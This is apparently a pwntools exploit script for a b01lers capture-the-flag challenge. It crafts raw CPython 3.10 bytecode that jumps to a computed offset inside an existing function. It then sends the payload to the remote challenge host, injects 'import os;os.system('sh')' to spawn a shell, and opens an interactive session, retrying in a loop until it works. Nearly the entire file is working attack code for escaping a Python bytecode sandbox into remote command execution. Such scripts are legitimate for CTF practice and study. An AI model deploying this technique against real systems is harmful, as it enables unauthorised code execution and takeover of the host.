# useful links
# https://docs.python.org/3.10/library/dis.html
# https://github.com/python/cpython/blob/3.10/Include/cpython/code.h
# https://github.com/python/cpython/blob/3.10/Include/cpython/bytesobject.h
# https://github.com/python/cpython/blob/3.10/Python/ceval.c
# https://github.com/python/cpython/blob/main/Python/ceval_macros.h
import dis
import opcode

from pwn import *


# from https://juliapoo.github.io/security/2021/05/29/load_fast-py3-vm.html
def inst(opc: str, arg: int = 0):
	"Makes life easier in writing python bytecode"

	nb = max(1, -(-arg.bit_length() // 8))
	ab = arg.to_bytes(nb, "big")
	ext_arg = opcode.opmap["EXTENDED_ARG"]
	inst = bytearray()
	for i in range(nb - 1):
		inst.append(ext_arg)
		inst.append(ab[i])
	inst.append(opcode.opmap[opc])
	inst.append(ab[-1])

	return bytes(inst)


"""
found possible <function MutableMapping.popitem at 0x7efe02c9d750> collections.abc 6 8 1
975           0 SETUP_FINALLY            8 (to 18)

976           2 LOAD_GLOBAL              0 (next)
              4 LOAD_GLOBAL              1 (iter)
              6 LOAD_FAST                0 (self)
              8 CALL_FUNCTION            1
             10 CALL_FUNCTION            1
             12 STORE_FAST               1 (key)
             14 POP_BLOCK
             16 JUMP_FORWARD            10 (to 38)
"""

offset = 1728880 + 2

bytecode = b"".join([
	inst("JUMP_ABSOLUTE", offset // 2),
])

payload = bytecode.ljust(100, b"\x09")
dis.dis(payload)
while True:
	#s = remote("localhost", 1337)
	s = remote("monochromatic.atreides.b01lersc.tf", 8443, ssl=True)

	s.sendlineafter(b"Bytecode: ", payload.hex().encode())
	s.sendlineafter(b"Names: ", b"exec input")
	s.sendline(b"import os;os.system('sh')")
	resp = s.recvrepeat(0.1)
	print(resp.decode())
	if not s.closed["recv"]:
		s.interactive()
		break
	s.close()
